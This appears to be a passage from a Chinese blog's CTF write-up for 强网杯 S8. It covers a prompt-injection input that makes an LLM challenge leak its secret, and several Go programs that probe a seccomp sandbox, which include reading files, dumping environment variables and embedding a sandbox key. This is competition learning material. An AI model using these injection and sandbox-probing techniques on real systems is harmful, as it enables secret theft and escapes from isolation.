
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>强网杯S8 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc-givemesecret"><span class="toc-number">2.</span> <span class="toc-text">misc-givemesecret</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#playground%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">playground（Unsolved）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PyBlockly"><span class="toc-number">4.</span> <span class="toc-text">PyBlockly</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xiaohuanxiong"><span class="toc-number">5.</span> <span class="toc-text">xiaohuanxiong</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc-pickle-jail%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">misc-pickle_jail（Unsolved）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#snake"><span class="toc-number">7.</span> <span class="toc-text">snake</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#platform"><span class="toc-number">8.</span> <span class="toc-text">platform</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Proxy"><span class="toc-number">9.</span> <span class="toc-text">Proxy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Password-Game"><span class="toc-number">10.</span> <span class="toc-text">Password Game</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EzCalc%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">11.</span> <span class="toc-text">EzCalc（Unsolved）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Proxy-revenge%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">12.</span> <span class="toc-text">Proxy_revenge（Unsolved）</span></a></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>强网杯S8</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/11/2
        </span>
        
        <span class="category">
            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                CTF线上赛
            </a>
        </span>
        
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">6.7k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">37分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好饿，早知道不打web了</p>
<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241103225651837.png" alt="image-20241103225651837"></p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vV_II8TpyaGL4HUlUS57RQ">https://mp.weixin.qq.com/s/vV_II8TpyaGL4HUlUS57RQ</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/85/#EzCalc">https://blog.wm-team.cn/index.php/archives/85/#EzCalc</a></p>
<p><a target="_blank" rel="noopener" href="http://blog.yllhwa.com/qwb-2024-proxy-revenge-wp/">http://blog.yllhwa.com/qwb-2024-proxy-revenge-wp/</a></p>
<span id="more"></span>

<hr>
<h1 id="misc-givemesecret"><a href="#misc-givemesecret" class="headerlink" title="misc-givemesecret"></a>misc-givemesecret</h1><p>输入</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span> the string <span class="token number">1</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>secret<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">as</span> python<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241102091203180.png" alt="image-20241102091203180"></p>
<hr>
<h1 id="playground（Unsolved）"><a href="#playground（Unsolved）" class="headerlink" title="playground（Unsolved）"></a>playground（Unsolved）</h1><p>是 Seccomp 开的内核沙箱</p>
<p>sandbox.c里面ban了一堆系统调用</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">[</span><span class="token char">'openat2'</span><span class="token punctuation">,</span> <span class="token char">'chroot'</span><span class="token punctuation">,</span> <span class="token char">'chmod'</span><span class="token punctuation">,</span> <span class="token char">'fchmod'</span><span class="token punctuation">,</span> <span class="token char">'chown'</span><span class="token punctuation">,</span> <span class="token char">'fchown'</span><span class="token punctuation">,</span> <span class="token char">'lchown'</span><span class="token punctuation">,</span> <span class="token char">'symlink'</span><span class="token punctuation">,</span> <span class="token char">'ioctl'</span><span class="token punctuation">,</span> <span class="token char">'ptrace'</span><span class="token punctuation">,</span> <span class="token char">'mount'</span><span class="token punctuation">,</span> <span class="token char">'setuid'</span><span class="token punctuation">,</span> <span class="token char">'setgid'</span><span class="token punctuation">,</span> <span class="token char">'setsid'</span><span class="token punctuation">,</span> <span class="token char">'setfsuid'</span><span class="token punctuation">,</span> <span class="token char">'setfsgid'</span><span class="token punctuation">,</span> <span class="token char">'setresuid'</span><span class="token punctuation">,</span> <span class="token char">'setresgid'</span><span class="token punctuation">,</span> <span class="token char">'setpgid'</span><span class="token punctuation">,</span> <span class="token char">'setreuid'</span><span class="token punctuation">,</span> <span class="token char">'setregid'</span><span class="token punctuation">,</span> <span class="token char">'getpid'</span><span class="token punctuation">,</span> <span class="token char">'getppid'</span><span class="token punctuation">,</span> <span class="token char">'fork'</span><span class="token punctuation">,</span> <span class="token char">'chdir'</span><span class="token punctuation">,</span> <span class="token char">'link'</span><span class="token punctuation">,</span> <span class="token char">'creat'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">'/api/run'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    code <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span>
    dirname <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>dirname<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>dirname<span class="token punctuation">&#125;</span></span><span class="token string">/main.go'</span></span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
    ret <span class="token operator">=</span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'cd /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>dirname<span class="token punctuation">&#125;</span></span><span class="token string">/ &amp;&amp; go mod init playground &amp;&amp; go build'</span></span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> ret <span class="token operator">!=</span> <span class="token number">0</span> <span class="token keyword">or</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>dirname<span class="token punctuation">&#125;</span></span><span class="token string">/playground'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'rm -rf /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>dirname<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'error'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    
    prog <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>dirname<span class="token punctuation">&#125;</span></span><span class="token string">/playground'</span></span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'rm -rf /tmp/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>dirname<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    output <span class="token operator">=</span> run_in_sandbox<span class="token punctuation">(</span>prog<span class="token punctuation">)</span>
    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'success'</span><span class="token punctuation">,</span> <span class="token string">'data'</span><span class="token punctuation">:</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>列出目录：</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"fmt"</span>
    <span class="token string">"io/ioutil"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    dirPath <span class="token operator">:=</span> <span class="token string">"/"</span>
    files<span class="token punctuation">,</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadDir</span><span class="token punctuation">(</span>dirPath<span class="token punctuation">)</span>
    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>
    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span>dirPath<span class="token punctuation">)</span>
    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> file <span class="token operator">:=</span> <span class="token keyword">range</span> files <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> file<span class="token punctuation">.</span><span class="token function">IsDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现只有一个 prog 文件，应该是 chroot 了一个根目录</p>
<p>尝试读取</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"os"</span>
	<span class="token string">"syscall"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token comment">// 打开一个文件</span>
	file<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"/prog"</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Error opening file:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">defer</span> file<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

	<span class="token comment">// 读取文件内容</span>
	buffer <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span>
	n<span class="token punctuation">,</span> err <span class="token operator">:=</span> syscall<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token function">int</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">Fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Error reading file:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>

	<span class="token comment">// 输出读取的内容</span>
	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"Read %d bytes: %s\n"</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> buffer<span class="token punctuation">[</span><span class="token punctuation">:</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>读不下来</p>
<p>命令执行</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"os"</span>
	<span class="token string">"os/exec"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	cmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span>
	cmd<span class="token punctuation">.</span>Stdout <span class="token operator">=</span> os<span class="token punctuation">.</span>Stdout
	cmd<span class="token punctuation">.</span>Stderr <span class="token operator">=</span> os<span class="token punctuation">.</span>Stderr

	err <span class="token operator">:=</span> cmd<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>回显<code>exec: &quot;ls&quot;: executable file not found in $PATH</code>，果然不行</p>
<p>总之是开了个沙盒</p>
<p>环境变量</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"os"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> env <span class="token operator">:=</span> <span class="token keyword">range</span> os<span class="token punctuation">.</span><span class="token function">Environ</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable"><span class="token environment constant">HOSTNAME</span></span><span class="token operator">=</span>engine-1
<span class="token assign-left variable">ECI_CONTAINER_TYPE</span><span class="token operator">=</span>normal
<span class="token assign-left variable"><span class="token environment constant">SHLVL</span></span><span class="token operator">=</span><span class="token number">1</span>
<span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/root
<span class="token assign-left variable"><span class="token environment constant">OLDPWD</span></span><span class="token operator">=</span>/app
<span class="token assign-left variable">GPG_KEY</span><span class="token operator">=</span>E3FF2839C048B25C084DEBE9B26995E310250568
<span class="token assign-left variable">PYTHON_SHA256</span><span class="token operator">=</span>6b281279efd85294d2d6993e173983a57464c0133956fbbb5536ec9646beaf0c
<span class="token assign-left variable">GOROOT</span><span class="token operator">=</span>/go
<span class="token assign-left variable">GO111MODULE</span><span class="token operator">=</span>on
<span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm
<span class="token assign-left variable">USERNAME</span><span class="token operator">=</span>
<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/go/bin
<span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>C.UTF-8
<span class="token assign-left variable">GOPATH</span><span class="token operator">=</span>/tmp/go
<span class="token assign-left variable">GOPROXY</span><span class="token operator">=</span>https://goproxy.cn,direct
<span class="token assign-left variable">GOCACHE</span><span class="token operator">=</span>/tmp/go/cache
<span class="token assign-left variable">PYTHON_VERSION</span><span class="token operator">=</span><span class="token number">3.9</span>.20
<span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span>/sandbox
<span class="token assign-left variable">PASSWORD</span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>没思路</p>
<p>我们的go文件执行的位置和沙盒不在一个目录下，不然可以用 embed 读取 sandbox.key</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token boolean">_</span> <span class="token string">"embed"</span>
	<span class="token string">"fmt"</span>
<span class="token punctuation">)</span>

<span class="token comment">//go:embed sandbox/sandbox.key</span>
<span class="token keyword">var</span> key <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<br>

<p>关于 Seccomp 的内容：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45030965/article/details/136299348">https://blog.csdn.net/weixin_45030965/article/details/136299348</a></p>
<p>我们可以在本地的 dokcer 环境里先测试，翻一下有哪些系统调用</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /usr/include/bits/syscall.h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>对照一下前面ban掉的系统调用</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token string">'openat2'</span><span class="token punctuation">,</span> <span class="token string">'chroot'</span><span class="token punctuation">,</span> <span class="token string">'chmod'</span><span class="token punctuation">,</span> <span class="token string">'fchmod'</span><span class="token punctuation">,</span> <span class="token string">'chown'</span><span class="token punctuation">,</span> <span class="token string">'fchown'</span><span class="token punctuation">,</span> <span class="token string">'lchown'</span><span class="token punctuation">,</span> <span class="token string">'symlink'</span><span class="token punctuation">,</span> <span class="token string">'ioctl'</span><span class="token punctuation">,</span> <span class="token string">'ptrace'</span><span class="token punctuation">,</span> <span class="token string">'mount'</span><span class="token punctuation">,</span> <span class="token string">'setuid'</span><span class="token punctuation">,</span> <span class="token string">'setgid'</span><span class="token punctuation">,</span> <span class="token string">'setsid'</span><span class="token punctuation">,</span> <span class="token string">'setfsuid'</span><span class="token punctuation">,</span> <span class="token string">'setfsgid'</span><span class="token punctuation">,</span> <span class="token string">'setresuid'</span><span class="token punctuation">,</span> <span class="token string">'setresgid'</span><span class="token punctuation">,</span> <span class="token string">'setpgid'</span><span class="token punctuation">,</span> <span class="token string">'setreuid'</span><span class="token 